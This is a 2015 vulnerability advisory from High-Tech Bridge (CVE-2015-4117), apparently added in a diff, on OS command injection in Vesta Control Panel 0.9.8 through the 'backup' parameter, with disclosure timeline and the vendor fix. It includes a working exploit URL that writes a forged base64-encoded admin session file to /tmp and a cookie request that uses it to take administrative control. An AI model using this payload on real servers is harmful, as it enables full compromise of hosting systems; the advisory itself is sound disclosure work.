@@ -1,0 +1,60 @@
+Advisory ID: HTB23261
+Product: Vesta Control Panel
+Vendor: http://vestacp.com
+Vulnerable Version(s): 0.9.8 and probably prior
+Tested Version: 0.9.8
+Advisory Publication:  May 20, 2015  [without technical details]
+Vendor Notification: May 20, 2015 
+Vendor Patch: June 3, 2015 
+Public Disclosure: June 17, 2015 
+Vulnerability Type: OS Command Injection [CWE-78]
+CVE Reference: CVE-2015-4117
+Risk Level: Critical 
+CVSSv2 Base Score: 9 (AV:N/AC:L/Au:S/C:C/I:C/A:C)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered critical vulnerability in Vesta Control Panel, which can be exploited to execute arbitrary system commands and gain complete access to the vulnerable system.
+
+The vulnerability exists due to insufficient filtration of user-input passed via the "backup" HTTP GET parametre to "/list/backup/index.php" before using it in the PHP 'exec()' function. A remote authenticated attacker can inject arbitrary commands and execute them on the system with privileges of the default Vesta Control Panel "admin" account. 
+
+Successful exploitation of this vulnerability may allow an attacker to gain complete control over the Vesta Control Panel and use it to advance his privileges on the system, manage installed services, reconfigure firewall, etc. Since Vesta Control Panel is a multiuser control panel for hosting multiple websites, any registered client can use the described vulnerability to compromise the entire system.
+
+A simple exploit below will create a PHP session file in "/tmp/" directory with administrative access to Vesta Control Panel:
+
+https://192.168.189.133:8083/list/backup/index.php?backup=123%27%20||%20  echo 'V0VCX1NZU1RFTXxzOjc6ImFwYWNoZTIiO1dFQl9SR1JPVVBTfHM6ODoid3d3LWRhdGEiO1dFQl9QT1JUfHM6NDoiODA4MCI7V0VCX1NTTHxzOjc6Im1vZF9zc2wiO1dFQl9TU0xfUE9SVHxzOjQ6Ijg0NDMiO1BST1hZX1NZU1RFTXxzOjU6Im5naW54IjtQUk9YWV9QT1JUfHM6MjoiODAiO1BST1hZX1NTTF9QT1JUfHM6MzoiNDQzIjtGVFBfU1lTVEVNfHM6NjoidnNmdHBkIjtNQUlMX1NZU1RFTXxzOjU6ImV4aW00IjtJTUFQX1NZU1RFTXxzOjc6ImRvdmVjb3QiO0FOVElWSVJVU19TWVNURU18czowOiIiO0FOVElTUEFNX1NZU1RFTXxzOjA6IiI7REJfU1lTVEVNfHM6NToibXlzcWwiO0ROU19TWVNURU18czo1OiJiaW5kOSI7U1RBVFNfU1lTVEVNfHM6MTc6IndlYmFsaXplcixhd3N0YXRzIjtCQUNLVVBfU1lTVEVNfHM6NToibG9jYWwiO0NST05fU1lTVEVNfHM6NDoiY3JvbiI7RElTS19RVU9UQXxzOjI6Im5vIjtGSVJFV0FMTF9TWVNURU18czo4OiJpcHRhYmxlcyI7RklSRVdBTExfRVhURU5TSU9OfHM6ODoiZmFpbDJiYW4iO1JFUE9TSVRPUll8czo1OiJjbW1udCI7VkVSU0lPTnxzOjU6IjAuOS44IjtMQU5HVUFHRXxzOjI6ImVuIjtsYW5ndWFnZXxzOjI6ImVuIjt1c2VyfHM6NToiYWRtaW4iO2JhY2t8czoxMToiL2xpc3QvdXNlci8iOw==' | base64 --decode > /tmp/sess_12345%20||%20echo%20\
+  
+After successful creation of PHP session file, the following cookie can be used to gain administrative access:
+ 
+ 
+GET / HTTP/1.1
+Cookie: mp_b5e6ddf58b2d02245a7a19005d1cec48_mixpanel=%7B%22distinct_id%22%3A%20%2214d5bb8613c39-02d2d6f80b48dc8-44564136-1fa400-14d5bb8613d828%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2F192.168.189.133%3A8000%2F%22%2C%22%24initial_referring_domain%22%3A%20%22192.168.189.133%3A8000%22%7D; PHPSESSID=12345
+
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to Vesta Control Panel 0.9.8-14
+
+More Information:
+http://vestacp.com/roadmap/#history
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23261 - https://www.htbridge.com/advisory/HTB23261 - OS Command Injection in Vesta Control Panel.
+[2] Vesta Control Panel - http://vestacp.com - Open Source web hosting control panel with premium features, secure, advanced and minimalistic design
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
